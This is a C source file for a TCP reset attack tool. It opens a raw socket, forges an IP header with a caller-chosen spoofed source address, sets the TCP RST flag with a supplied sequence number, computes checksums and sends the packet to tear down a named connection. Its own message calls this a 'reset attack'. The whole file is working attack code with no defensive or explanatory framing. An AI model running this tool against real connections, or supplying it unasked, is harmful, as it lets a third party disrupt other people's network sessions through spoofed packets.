#include <assert.h>
#include <netinet/in.h>
#include <pcap/pcap.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PACKET(Name, Header_T)                                                 \
	typedef struct {                                                           \
		Header_T header;                                                       \
		u_char data[];                                                         \
	} Name

PACKET(ip_t, struct iphdr);
PACKET(tcp_t, struct tcphdr);

unsigned short in_checksum(unsigned short *data, int length) {
	unsigned short *curr = data;
	unsigned int sum = 0;

	while (length > 1) {
		sum += *curr++;
		length -= 2;
	}

	if (length == 1) {
		unsigned short temp = 0;
		*(u_char *)&temp = *(u_char *)curr;
		sum += temp;
	}

	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

typedef struct {
	uint32_t src_addr;
	uint32_t dst_addr;
	uint8_t _placeholder;
	uint8_t protocol;
	uint16_t tcp_len;
} psh_t;

u_char packet_buffer[4096] = {0};
u_char tcp_psuedo_buff[4046] = {0};

void send_reset_packet(const char *target_ip, u_short target_port,
					   const char *source_ip, u_short source_port,
					   u_long seq_number) {
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	int one = 1;

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

	ip_t *ip_pkt = (ip_t *)packet_buffer;

	ip_pkt->header.saddr = arc4random();

	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(target_port);
	sin.sin_addr.s_addr = inet_addr(target_ip);

	ip_pkt->header.ihl = 5;
	ip_pkt->header.version = 4;
	ip_pkt->header.tos = 0;
	ip_pkt->header.tot_len = htons(sizeof(ip_t) + sizeof(tcp_t));
	ip_pkt->header.id = htons(42069);
	ip_pkt->header.frag_off = 0;
	ip_pkt->header.ttl = 255;
	ip_pkt->header.protocol = IPPROTO_TCP;
	ip_pkt->header.check = 0;
	ip_pkt->header.saddr = inet_addr(source_ip);
	ip_pkt->header.daddr = sin.sin_addr.s_addr;

	tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;

	tcp_pkt->header.source = htons(source_port);
	tcp_pkt->header.dest = htons(target_port);
	tcp_pkt->header.seq = htonl(seq_number);
	tcp_pkt->header.ack_seq = 0;
	tcp_pkt->header.doff = 5;

	tcp_pkt->header.th_flags = TH_RST;
	tcp_pkt->header.check = 0;
	tcp_pkt->header.urg_ptr = 0;

	psh_t *tcp_chksum_buff = (psh_t *)tcp_psuedo_buff;
	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_chksum_buff->src_addr = ip_pkt->header.saddr;
	tcp_chksum_buff->dst_addr = ip_pkt->header.daddr;
	tcp_chksum_buff->_placeholder = 0;
	tcp_chksum_buff->protocol = IPPROTO_TCP;
	tcp_chksum_buff->tcp_len = htons(sizeof(tcp_t));

	int transmit_len = sizeof(ip_t) + sizeof(tcp_t);

	ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));

	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t));

	tcp_pkt->header.check =
		in_checksum((u_short *)tcp_psuedo_buff, sizeof(psh_t) + sizeof(tcp_t));

	sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
		   sizeof(sin));

	close(sock);
}

const char *print_usage() {
	printf("Did not recieve enough arguments!");
	exit(1);

	return NULL;
}

#define shift(buff, len) ((len-- > 0) ? (*buff++) : (print_usage()))

int main(int argc, const char **argv) {
	// Shift out the program name
	const char *program_name = shift(argv, argc);

	const char *target_ip, *source_ip;
	u_short target_port, source_port;
	u_long seq_number;

	target_ip = shift(argv, argc);
	sscanf(shift(argv, argc), "%hu", &target_port);

	source_ip = shift(argv, argc);
	sscanf(shift(argv, argc), "%hu", &source_port);

	sscanf(shift(argv, argc), "%lu", &seq_number);

	printf("Trying reset attack on connection specified by (target=%s:%hu, "
		   "source=%s:%hu) with seq number %lu\n",
		   target_ip, target_port, source_ip, source_port, seq_number);

	send_reset_packet(target_ip, target_port, source_ip, source_port,
					  seq_number);

	printf("Done.");
}
